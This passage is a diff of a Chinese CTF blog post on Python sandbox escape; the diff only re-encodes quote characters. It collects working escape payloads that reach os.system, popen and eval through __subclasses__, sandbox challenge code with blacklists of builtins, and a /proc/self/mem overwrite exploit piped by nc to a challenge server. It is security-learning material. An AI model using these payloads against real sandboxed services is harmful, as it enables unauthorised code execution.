 s = s [::-1]
@@ -170,64 +170,64 @@ print a[s]
 <p>所谓曲线救国的“曲线”,就是对方封锁了从山下上半山腰营地的道路，那我们可以偷偷从山背后上山到山顶，然后从山顶下到半山腰的营地偷袭。</p>
 <h4 id="2-一切皆对象的py"><a href="#2-一切皆对象的py" class="headerlink" title="2.一切皆对象的py"></a>2.一切皆对象的py</h4><p>我们看看python是怎么一切皆对象的</p>
 <pre><code>&gt;&gt;&gt; type([])
-&lt;type &apos;list&apos;&gt;
+&lt;type &#39;list&#39;&gt;
 
 &gt;&gt;&gt; type(1)
-&lt;type &apos;int&apos;&gt;
+&lt;type &#39;int&#39;&gt;
 
 &gt;&gt;&gt; type(1.1)
-&lt;type &apos;float&apos;&gt;
+&lt;type &#39;float&#39;&gt;
 
-&gt;&gt;&gt; type(&apos;&apos;)
-&lt;type &apos;str&apos;&gt;
+&gt;&gt;&gt; type(&#39;&#39;)
+&lt;type &#39;str&#39;&gt;
 
 &gt;&gt;&gt; type(())
-&lt;type &apos;tuple&apos;&gt;
+&lt;type &#39;tuple&#39;&gt;
 
 &gt;&gt;&gt; type({})
-&lt;type &apos;dict&apos;&gt;
+&lt;type &#39;dict&#39;&gt;
 </code></pre><p>这些类型都是对象，我现在就以 <code>&#39;&#39;</code> 为例</p>
 <p>1)我们可以从一个对象实例向上追溯到他的类<br><code>&#39;&#39;.__class__</code></p>
-<pre><code>&gt;&gt;&gt; type(&apos;&apos;.__class__)
-&lt;type &apos;type&apos;&gt;
+<pre><code>&gt;&gt;&gt; type(&#39;&#39;.__class__)
+&lt;type &#39;type&#39;&gt;
 </code></pre><p>2)我们从他的类向上追溯到他的基类，直至object根类</p>
 <p>①多次使用<code>__base__</code> 或者 <code>__bases__</code></p>
-<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__
-&lt;type &apos;basestring&apos;&gt;
+<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__base__
+&lt;type &#39;basestring&#39;&gt;
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__
-&lt;type &apos;object&apos;&gt;
+&gt;&gt;&gt; &#39;&#39;.__class__.__base__.__base__
+&lt;type &#39;object&#39;&gt;
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__bases__[0]
-&lt;type &apos;basestring&apos;&gt;
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__[0]
+&lt;type &#39;basestring&#39;&gt;
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__bases__[0].__bases__[0]
-&lt;type &apos;object&apos;&gt;
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__[0].__bases__[0]
+&lt;type &#39;object&#39;&gt;
 
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__bases__
-(&lt;type &apos;basestring&apos;&gt;,)
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__
+(&lt;type &#39;basestring&#39;&gt;,)
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__bases__.__class__
-&lt;type &apos;tuple&apos;&gt;
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__.__class__
+&lt;type &#39;tuple&#39;&gt;
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__bases__.__class__.__bases__[0]
-&lt;type &apos;object&apos;&gt;
+&gt;&gt;&gt; &#39;&#39;.__class__.__bases__.__class__.__bases__[0]
+&lt;type &#39;object&#39;&gt;
 </code></pre><p>②直接使用<code>__mro__</code></p>
-<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__
-(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)
+<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__
+(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]
-&lt;type &apos;object&apos;&gt;
+&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2]
+&lt;type &#39;object&#39;&gt;
 </code></pre><p>3）我们从根类object向下回溯，使用 <code>__subclasses__</code></p>
-<pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]
-&lt;type &apos;object&apos;&gt;
+<pre><code>&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2]
+&lt;type &#39;object&#39;&gt;
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__
+&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__
 &lt;built-in method __subclasses__ of type object at 0x8f8740&gt;
 
-&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()
-[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;]
+&gt;&gt;&gt; &#39;&#39;.__class__.__mro__[2].__subclasses__()
+[&lt;type &#39;type&#39;&gt;, &lt;type &#39;weakref&#39;&gt;, &lt;type &#39;weakcallableproxy&#39;&gt;, &lt;type &#39;weakproxy&#39;&gt;, &lt;type &#39;int&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;bytearray&#39;&gt;, &lt;type &#39;list&#39;&gt;, &lt;type &#39;NoneType&#39;&gt;, &lt;type &#39;NotImplementedType&#39;&gt;, &lt;type &#39;traceback&#39;&gt;, &lt;type &#39;super&#39;&gt;, &lt;type &#39;xrange&#39;&gt;, &lt;type &#39;dict&#39;&gt;, &lt;type &#39;set&#39;&gt;, &lt;type &#39;slice&#39;&gt;, &lt;type &#39;staticmethod&#39;&gt;, &lt;type &#39;complex&#39;&gt;, &lt;type &#39;float&#39;&gt;, &lt;type &#39;buffer&#39;&gt;, &lt;type &#39;long&#39;&gt;, &lt;type &#39;frozenset&#39;&gt;, &lt;type &#39;property&#39;&gt;, &lt;type &#39;memoryview&#39;&gt;, &lt;type &#39;tuple&#39;&gt;, &lt;type &#39;enumerate&#39;&gt;, &lt;type &#39;reversed&#39;&gt;, &lt;type &#39;code&#39;&gt;, &lt;type &#39;frame&#39;&gt;, &lt;type &#39;builtin_function_or_method&#39;&gt;, &lt;type &#39;instancemethod&#39;&gt;, &lt;type &#39;function&#39;&gt;, &lt;type &#39;classobj&#39;&gt;, &lt;type &#39;dictproxy&#39;&gt;, &lt;type &#39;generator&#39;&gt;, &lt;type &#39;getset_descriptor&#39;&gt;, &lt;type &#39;wrapper_descriptor&#39;&gt;, &lt;type &#39;instance&#39;&gt;, &lt;type &#39;ellipsis&#39;&gt;, &lt;type &#39;member_descriptor&#39;&gt;, &lt;type &#39;file&#39;&gt;, &lt;type &#39;PyCapsule&#39;&gt;, &lt;type &#39;cell&#39;&gt;, &lt;type &#39;callable-iterator&#39;&gt;, &lt;type &#39;iterator&#39;&gt;, &lt;type &#39;sys.long_info&#39;&gt;, &lt;type &#39;sys.float_info&#39;&gt;, &lt;type &#39;EncodingMap&#39;&gt;, &lt;type &#39;fieldnameiterator&#39;&gt;, &lt;type &#39;formatteriterator&#39;&gt;, &lt;type &#39;sys.version_info&#39;&gt;, &lt;type &#39;sys.flags&#39;&gt;, &lt;type &#39;exceptions.BaseException&#39;&gt;, &lt;type &#39;module&#39;&gt;, &lt;type &#39;imp.NullImporter&#39;&gt;, &lt;type &#39;zipimport.zipimporter&#39;&gt;, &lt;type &#39;posix.stat_result&#39;&gt;, &lt;type &#39;posix.statvfs_result&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;_weakrefset._IterationGuard&#39;&gt;, &lt;class &#39;_weakrefset.WeakSet&#39;&gt;, &lt;class &#39;_abcoll.Hashable&#39;&gt;, &lt;type &#39;classmethod&#39;&gt;, &lt;class &#39;_abcoll.Iterable&#39;&gt;, &lt;class &#39;_abcoll.Sized&#39;&gt;, &lt;class &#39;_abcoll.Container&#39;&gt;, &lt;class &#39;_abcoll.Callable&#39;&gt;, &lt;type &#39;dict_keys&#39;&gt;, &lt;type &#39;dict_items&#39;&gt;, &lt;type &#39;dict_values&#39;&gt;, &lt;class &#39;site._Printer&#39;&gt;, &lt;class &#39;site._Helper&#39;&gt;, &lt;type &#39;_sre.SRE_Pattern&#39;&gt;, &lt;type &#39;_sre.SRE_Match&#39;&gt;, &lt;type &#39;_sre.SRE_Scanner&#39;&gt;, &lt;class &#39;site.Quitter&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;]
 </code></pre><p>哇，这也太多了吧，我怎么知道我该选哪个？？<br>别怕，我python本就是用来写脚本的，写一个循环遍历一下岂不是简简单单？？</p>
 <p>我这里就直接把bendawang 师傅文章中的代码拿过来</p>
 <pre><code>#!/usr/bin/env python
@@ -236,7 +236,7 @@ print a[s]
 cnt=0
 for item in [].__class__.__base__.__subclasses__():
     try:
-        if &apos;os&apos; in item.__init__.__globals__:
+        if &#39;os&#39; in item.__init__.__globals__:
             print cnt,item
         cnt+=1
     except:
@@ -252,7 +252,7 @@ for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():
     try:
         cnt2=0
         for i in item.__init__.__globals__:
-            if &apos;eval&apos; in item.__init__.__globals__[i]:
+            if &#39;eval&#39; in item.__init__.__globals__[i]:
                 print cnt,item,cnt2,i
             cnt2+=1
         cnt+=1
@@ -263,25 +263,25 @@ for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():
 </code></pre><p>这第二个脚本相当于就是跑了两层</p>
 <p>这两个脚本的思路非常的好，赶紧搬过来收藏一下，以后作为参考hhh</p>
 <p><strong>4）简单的整理一下前辈们已经fuzz出来的一些结果：</strong></p>
-<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)
+<pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)
 
-[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)
+[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)
 
-&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)
 
-&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&apos;)
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)
 
 &quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()
 
-&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&apos;os.system(&quot;ls&quot;)&apos;)
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,&#39;os.system(&quot;ls&quot;)&#39;)
 
-&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&apos;func_globals&apos;)[&apos;linecache&apos;].__dict__[&apos;sys&apos;].modules[&apos;os&apos;].popen(&apos;ls&apos;).read()
+&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()
 </code></pre><h2 id="六、内存破坏突破python沙盒"><a href="#六、内存破坏突破python沙盒" class="headerlink" title="六、内存破坏突破python沙盒"></a>六、内存破坏突破python沙盒</h2><p>这个方法来源于 Plaid CTF 2014年的一道题<code>__nightmares__</code><br>这道题的出题思路并不是web的单纯的绕过，而是涉及到了内存的破坏与利用<br>附上题目代码：</p>
 <pre><code>#!/usr/bin/python -u
-&apos;&apos;&apos;
+&#39;&#39;&#39;
 You may wish to refer to solutions to the pCTF 2013 &quot;pyjail&quot; problem if
-you choose to attempt this problem, BUT IT WON&apos;T HELP HAHAHA.
-&apos;&apos;&apos;
+you choose to attempt this problem, BUT IT WON&#39;T HELP HAHAHA.
+&#39;&#39;&#39;
 
 from imp import acquire_lock
 from threading import Thread
@@ -298,12 +298,12 @@ del Thread
 # No more modules!
 for k, v in modules.iteritems():
     if v == None: continue
-    if k == &apos;__main__&apos;: continue
+    if k == &#39;__main__&#39;: continue
     v.__dict__.clear()
 
 del k, v
 
-__main__ = modules[&apos;__main__&apos;]
+__main__ = modules[&#39;__main__&#39;]
 modules.clear()
 del modules
 
@@ -312,12 +312,12 @@ del __builtins__, __doc__, __file__, __name__, __package__
 
 print &gt;&gt; stdout, &quot;Get a shell. The flag is NOT in ./key, ./flag, etc.&quot;
 while 1:
-    exec &apos;print &gt;&gt; stdout, &apos; + stdin.readline() in {&apos;stdout&apos;:stdout}
+    exec &#39;print &gt;&gt; stdout, &#39; + stdin.readline() in {&#39;stdout&#39;:stdout}
 </code></pre><p>WP address :<a href="https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/" target="_blank" rel="noopener">https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/</a></p>
 <h2 id="七、一些简单的python-沙盒"><a href="#七、一些简单的python-沙盒" class="headerlink" title="七、一些简单的python 沙盒"></a>七、一些简单的python 沙盒</h2><p>下面列出一些python 的沙盒代码，给学习的人一些参考</p>
 <h3 id="题目一、"><a href="#题目一、" class="headerlink" title="题目一、"></a>题目一、</h3><pre><code>  ____                  
  |  _ \ _   _ _ __      
- | |_) | | | | &apos;_ \     
+ | |_) | | | | &#39;_ \     
  |  _ &lt;| |_| | | | |    
  |_| \_\__,_|_| |_|    
 
@@ -338,17 +338,17 @@ from sys import modules
 from cpython import get_dict
 from types import FunctionType
 
-main  = modules[&apos;__main__&apos;].__dict__
-origin_builtins = main[&apos;__builtins__&apos;].__dict__
+main  = modules[&#39;__main__&#39;].__dict__
+origin_builtins = main[&#39;__builtins__&#39;].__dict__
 
 def delete_type():
     type_dict = get_dict(type)
-    del type_dict[&apos;__bases__&apos;]
-    del type_dict[&apos;__subclasses__&apos;]
+    del type_dict[&#39;__bases__&#39;]
+    del type_dict[&#39;__subclasses__&#39;]
 
 def delete_func_code():
     func_dict = get_dict(FunctionType)
-    del func_dict[&apos;func_code&apos;]
+    del func_dict[&#39;func_code&#39;]
 
 def safe_import(__import__,whiteList):
     def importer(name,globals={},locals={},fromlist=[],level=-1):
@@ -396,9 +396,9 @@ builtins_clear();del builtins_clear
 
 
 whiteMod = []
-origin_builtins[&apos;__import__&apos;] = safe_import(__import__,whiteMod)
+origin_builtins[&#39;__import__&#39;] = safe_import(__import__,whiteMod)
 safe_builtins = ReadOnly(origin_builtins);del ReadOnly
-main[&apos;__builtins__&apos;] = safe_builtins;del safe_builtins
+main[&#39;__builtins__&#39;] = safe_builtins;del safe_builtins
 
 del get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionType
 del __builtins__, __doc__, __file__, __name__, __package__
@@ -406,7 +406,7 @@ del __builtins__, __doc__, __file__, __name__, __package__
 print &quot;&quot;&quot;
   ____                  
  |  _ \ _   _ _ __      
- | |_) | | | | &apos;_ \     
+ | |_) | | | | &#39;_ \     
  |  _ &lt;| |_| | | | |    
  |_| \_\\__,_|_| |_|    
 
@@ -418,12 +418,12 @@ Try to getshell then find the flag!
 &quot;&quot;&quot;
 
 while 1:
-    inp = raw_input(&apos;&gt;&gt;&gt;&apos;)
+    inp = raw_input(&#39;&gt;&gt;&gt;&#39;)
     cmd = input_filter(inp)
     try:
         exec cmd 
     except NameError, e:
-        print &quot;wow something lose!We can\&apos;t find it !  D:&quot;
+        print &quot;wow something lose!We can\&#39;t find it !  D:&quot;
     except SyntaxError,e:
         print &quot;Noob! Synax Wrong! :(&quot;
     except Exception,e:
@@ -431,21 +431,21 @@ while 1:
 
 &gt;&gt;&gt;Traceback (most recent call last):
   File &quot;/home/ctf/sandbox.py&quot;, line 92, in &lt;module&gt;
-    inp = raw_input(&apos;&gt;&gt;&gt;&apos;)
+    inp = raw_input(&#39;&gt;&gt;&gt;&#39;)
 EOFError: EOF when reading a line
 </code></pre><p>补充：这道题就是最近的异常比赛的题目源码，我做题 下载了下来，出题者本来的意图应该就是让我们使用内存攻击的pwn 的手法，但是还是被我们web选手饶了过去<br>下面给出pwn的一种解法：</p>
 <pre><code># look up the addresses
-objdump -R python.out | grep -E &apos;fopen|system&apos; 
+objdump -R python.out | grep -E &#39;fopen|system&#39; 
 
 # copy 8 bytes from the system address to the fopen64 address, and get flag
-echo &quot;(lambda r, w: r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40](&apos;grep ciscn -r /home/ctf/&apos;)) (().__class__.__bases__[0].__subclasses__()[40](&apos;/proc/self/mem&apos;,&apos;r&apos;), ().__class__.__bases__[0].__subclasses__()[40](&apos;/proc/self/mem&apos;,&apos;w&apos;,0))&quot; | nc 117.78.43.163 31836
+echo &quot;(lambda r, w: r.seek(0x08de2b8) or w.seek(0x08de8c8) or w.write(r.read(8)) or ().__class__.__bases__[0].__subclasses__()[40](&#39;grep ciscn -r /home/ctf/&#39;)) (().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;,&#39;r&#39;), ().__class__.__bases__[0].__subclasses__()[40](&#39;/proc/self/mem&#39;,&#39;w&#39;,0))&quot; | nc 117.78.43.163 31836
 </code></pre><p>接下来是web解（来源于梅子酒师傅）</p>
 <pre><code>s = &quot;func_global&quot;+&quot;s&quot;
 d = &quot;sy&quot;+&quot;s&quot;
 b = &quot;o&quot;+&quot;s&quot;
 c = &quot;l&quot;+&quot;s&quot;
 
-print(&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(s)[&apos;linecache&apos;].__dict__[d].modules[b].popen(c).read())
+print(&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(s)[&#39;linecache&#39;].__dict__[d].modules[b].popen(c).read())
 </code></pre><h3 id="题目二"><a href="#题目二" class="headerlink" title="题目二"></a>题目二</h3><pre><code>#!/usr/bin/env python
 from future import print_function
 
@@ -466,13 +466,13 @@ banned = [
 ]
 
 targets = builtins.dict.keys() 
-targets.remove(&apos;raw_input&apos;) 
-targets.remove(&apos;print&apos;) 
+targets.remove(&#39;raw_input&#39;) 
+targets.remove(&#39;print&#39;) 
 for x in targets: 
     del builtins.dict[x]
 
 while 1: 
-    print(&quot;&gt;&gt;&gt;&quot;, end=&apos; &apos;)
+    print(&quot;&gt;&gt;&gt;&quot;, end=&#39; &#39;)
     data = raw_input()
 
     for no in banned:
@@ -484,33 +484,33 @@ while 1:
 </code></pre><h3 id="题目三"><a href="#题目三" class="headerlink" title="题目三"></a>题目三</h3><pre><code>#!/usr/bin/env python
 from re import findall
 def make_secure():
-    UNSAFE = [&apos;open&apos;,
-              &apos;file&apos;,
-              &apos;execfile&apos;,
-              &apos;compile&apos;,
-              &apos;reload&apos;,
-              &apos;__import__&apos;,
-              &apos;eval&apos;,
-              &apos;input&apos;]
+    UNSAFE = [&#39;open&#39;,
+              &#39;file&#39;,
+              &#39;execfile&#39;,
+              &#39;compile&#39;,
+              &#39;reload&#39;,
+              &#39;__import__&#39;,
+              &#39;eval&#39;,
+              &#39;input&#39;]
     for func in UNSAFE:
         del __builtins__.__dict__[func]
 
 # Remove dangerous builtins
 make_secure()
-print &apos;Go Ahead, Expoit me &gt;;D&apos;
+print &#39;Go Ahead, Expoit me &gt;;D&#39;
 while True:
     try:
         # Read user input until the first whitespace character
-        inp = findall(&apos;\S+&apos;, raw_input())[0]
+        inp = findall(&#39;\S+&#39;, raw_input())[0]
         a = None
         # Set a to the result from executing the user input
-        exec &apos;a=&apos; + inp
-        print &apos;Return Value:&apos;, a
+        exec &#39;a=&#39; + inp
+        print &#39;Return Value:&#39;, a
     except Exception, e:
-    print &apos;Exception:&apos;, e
+    print &#39;Exception:&#39;, e
 </code></pre><p>参考链接：<br><a href="http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>
 <p><a href="http://www.0aa.me/index.php/archives/123/" target="_blank" rel="noopener">http://www.0aa.me/index.php/archives/123/</a></p>
 <p><a href="https://xz.aliyun.com/t/52" target="_blank" rel="noopener">https://xz.aliyun.com/t/52</a></p>
 <p><a href="https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/" target="_blank" rel="noopener">https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/</a></p>
 <p><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/78504415</a></p>
-</div><script type="text/javascript" src="/js/share.js?v=1.0.4" async></script><a data-url="https://www.k0rz3n.com/2018/05/04/Python 沙盒逃逸备忘/" data-id="cjv7v4td30086vgv83k38sqfb" class="article-share-link">Aktie</a><div class="tags"><a href="/tags/网络安全-沙盒逃逸-Python/">网络安全 沙盒逃逸 Python</a></div><div class="post-nav"><a href="/2018/05/17/搭建docker的 CTF getshell环境/" class="pre">搭建docker的 CTF getshell环境</a><a href="/2018/05/04/Python 的 type与class 之争/" class="next">Python 的 type与class 之争</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="side_toc"><div style="position:fixed" class="toc-article"><div class="toc-title">Inhalte</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、python-绕过沙盒中常见的函数、属性、模块解释（备忘）"><span class="toc-number">1.</span> <span class="toc-text">一、python 绕过沙盒中常见的函数、属性、模块解释（备忘）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-func-globals"><span class="toc-number">1.1.</span> <span class="toc-text">1.func_globals</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-getattribute"><span class="toc-number">1.2.</span> <span class="toc-text">2.__getattribute__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-dict"><span class="toc-number">1.3.</span> <span class="toc-text">3.__dict__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-dir"><span class="toc-number">1.4.</span> <span class="toc-text">4.dir()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-base"><span class="toc-number">1.5.</span> <span class="toc-text">5.__base__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-mro"><span class="toc-number">1.6.</span> <span class="toc-text">6.__mro__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-subclasses"><span class="toc-number">1.7.</span> <span class="toc-text">7.__subclasses__()[]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-import"><span class="toc-number">1.8.</span> <span class="toc-text">8.__import__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-bulitin"><span class="toc-number">1.9.</span> <span class="toc-text">9.__bulitin__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-builtins"><span class="toc-number">1.10.</span> <span class="toc-text">10.__builtins__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-reload"><span class="toc-number">1.11.</span> <span class="toc-text">11.reload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-getattr"><span class="toc-number">1.12.</span> <span class="toc-text">12.getattr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-getattr"><span class="toc-number">1.13.</span> <span class="toc-text">13.__getattr__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-name"><span class="toc-number">1.14.</span> <span class="toc-text">14.__name__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-func-code"><span class="toc-number">1.15.</span> <span class="toc-text">15.func_code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-timeit-模块"><span class="toc-number">1.16.</span> <span class="toc-text">16.timeit 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-platform-模块"><span class="toc-number">1.17.</span> <span class="toc-text">17.platform 模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-globals"><span class="toc-number">1.18.</span> <span class="toc-text">18.__globals__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-call"><span class="toc-number">1.19.</span> <span class="toc-text">19.__call__</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#20-pickle"><span class="toc-number">1.20.</span> <span class="toc-text">20.pickle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#21-os-subprocess-commands"><span class="toc-number">1.21.</span> <span class="toc-text">21.os/subprocess/commands</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-eval-exec-execfile"><span class="toc-number">1.22.</span> <span class="toc-text">22.eval/exec/execfile</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-importlib模块"><span class="toc-number">1.23.</span> <span class="toc-text">23.importlib模块</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、什么是python-的沙箱逃逸"><span class="toc-number">2.</span> <span class="toc-text">二、什么是python 的沙箱逃逸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、攻与防的战争"><span class="toc-number">3.</span> <span class="toc-text">三、攻与防的战争</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、整理一些小trick"><span class="toc-number">4.</span> <span class="toc-text">四、整理一些小trick</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 